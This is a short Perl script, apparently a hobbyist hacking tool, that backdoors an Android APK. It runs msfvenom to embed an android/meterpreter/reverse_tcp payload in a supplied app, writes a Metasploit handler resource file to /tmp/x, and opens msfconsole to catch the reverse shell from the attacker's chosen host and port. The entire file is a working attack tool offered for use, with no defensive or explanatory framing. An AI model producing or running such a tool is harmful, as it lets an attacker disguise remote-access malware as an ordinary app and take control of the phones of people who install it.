#!/usr/bin/perl
#Coded By Zero#
$apk=$ARGV[0];
$host=$ARGV[1];
$port=$ARGV[2];   
$out=$ARGV[3]; 
if( $ARGV[0] eq '-h' || $ARGV[0] eq '' || $ARGV[0] eq '--help')
{
print "Usage: backdoor-apk <apk> <ip/ddns> <port> <out>\n";
exit;
}
system("msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
system("echo use exploit/multi/handler > /tmp/x");
system("echo set payload android/meterpreter/reverse_tcp >> /tmp/x");
system("echo set lhost $host >> /tmp/x");
system("echo set lport $port >> /tmp/x");
system("echo run >> /tmp/x");
print("Opening MSF..\n");
system("msfconsole -q -r /tmp/x");
